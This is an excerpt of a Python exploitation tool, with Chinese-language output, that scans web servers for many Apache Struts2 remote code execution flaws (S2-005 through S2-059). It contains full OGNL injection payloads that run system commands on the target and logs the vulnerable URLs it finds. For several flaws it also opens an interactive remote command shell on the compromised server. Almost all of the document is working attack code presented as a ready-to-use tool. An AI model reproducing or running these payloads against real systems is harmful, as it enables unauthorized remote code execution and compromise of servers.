...
def poc(url, x):
    ...
    try:
        ...
        res = requests.get(url + 'login.action', data, timeout=2)
        # print(res.text)
    ...
    try:
        cmd = 'echo 367568'
        password = "?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'"+cmd+"\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))"
        data = {'username': '111', 'password': password}
        res = requests.get(url + 'login.action', data, timeout=2)
        # print(res.text)
        if b'367568' in res.content and b'echo' not in res.content:
            ...
            while x:
                ...
                c = '"' + b + '"'
                # print(c)
                password = "?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'"+c+"\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))"                # print(password)
                data = {'username': '111', 'password': password}
                res = requests.get(url + 'login.action', data)
                # print(res.content)
                m = re.findall(r'/tr>\\n(.*?)\\n\\x00', str(res.content))
    ...
    # s2-005
    try:
        url1 = "example/HelloWorld.action"
        ...
        html1 = requests.post(url + url1 + exec_payload1, timeout=2)
        html2 = requests.post(url + url1 + exec_payload2, timeout=2)
        # print(html2.content)
        if b'367568' in html1.content and b'echo' not in html1.content:
            ...
            if x == 0:
                with open('./漏洞url.txt', 'a') as f:
                    s = url + '\n' + '"----------存在S2-005----------"' + '\n\n\n\n'
                    f.write(s)
            web = requests.post(url + url1 + web_path)
            m = re.findall(r"b'(.*?)\\n", str(web.content))
            print("web路径为：", m[0])
            while x:
                cmd = input('shell>')
                ...
                html2 = requests.post(url + url1 + exec_payload1)
            ...
            while 1:
                ...
                html2 = requests.post(url + url1 + exec_payload2)
                d = re.findall(r"b'(.*?)\\n\\x00", str(html2.content))
                f = re.sub(r'\\n', '\n', d[0])
                print(f)
        else:
    ...
    try:
        ...
        data = {'age': b}
        res = requests.post(url + 'user.action', data=data, timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-007----------")
            if x == 0:
                with open('./漏洞url.txt', 'a') as f:
    ...
    try:
        ...
        url1 = "ajax/example5" + a
        res = requests.post(url + url1, timeout=2)
        # print(res.text)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-009----------")
            if x == 0:
    ...
    try:
        ...
        b = urllib.parse.unquote(a)
        data = {'name': b}
        res = requests.post(url + url1, data=data, timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-012----------")
            if x == 0:
                with open('./漏洞url.txt', 'a') as f:
    ...
    try:
        url1 = "link.action"
        a = "?a=%24{233%2a233}"
        res = requests.post(url + url1 + a, timeout=2)
    ...
    try:
        cmd = 'echo 367568'
        a = "?member=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("+cmd+").getInputStream()))"
        res = requests.get(url + a, timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print('-----------存在s2-016-----------')
            if x == 0:
    ...
    try:
        cmd = 'echo 367568'
        a = "?go=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27"+cmd+"%27%29.start%28%29%7D%2f..%2fadmin"
        res = requests.get(url + a, timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print('-----------存在s2-016-----------')
            if x == 0:
    ...
    try:
        ...
        res = requests.post(url + url1, headers=headers, timeout=2)
                ...
                while x:
                    ...
                    def exploit(url, cmd):
                        ...
                        try:
                            ...
                            try:
                                output = b""
                                with requests.get(url, headers=headers, verify=False, timeout=timeout,
...
'''.replace(b'\n', b'\r\n') % (len(q),)
    ...
    try:
        ...
        # print(payload)
        res = requests.post(url + url1, data=payload, headers=headers, timeout=2)
        res1 = requests.post(url + url1, headers=headers, timeout=2)
        ...
        if res.status_code == 500 and res1.status_code == 200:
            ...
            while x:
                ...
                payload = payload1 + payload3 + payload2
                # print(payload)
                res = requests.post(url + url1, data=payload, headers=headers)
                # print(res.text)
        else:
            print('不存在s2-052')
    except:
    ...
    try:
        ...
        res = requests.post(url + url1, data=data, headers=headers, timeout=2)
        if b'54289' in res.content:
            print('--------存在s2-053--------')
            if x == 0:
                with open('./漏洞url.txt', 'a') as f:
    ...
    try:
        url1 = "?id=%25{233*233}"
        res = requests.get(url + url1, timeout=0.5)
        # print(res.text)
        if b'54289' in res.content:
            print("----------存在S2-059----------")
            if x == 0:
...
if len(sys.argv) != 3:
    print('+--------------------------------------------------------------------------+')
    print('+ 单个URL EXP:   struts2.exe -u http://1.1.1.1:8081/  (不要加xxx.action)   +')
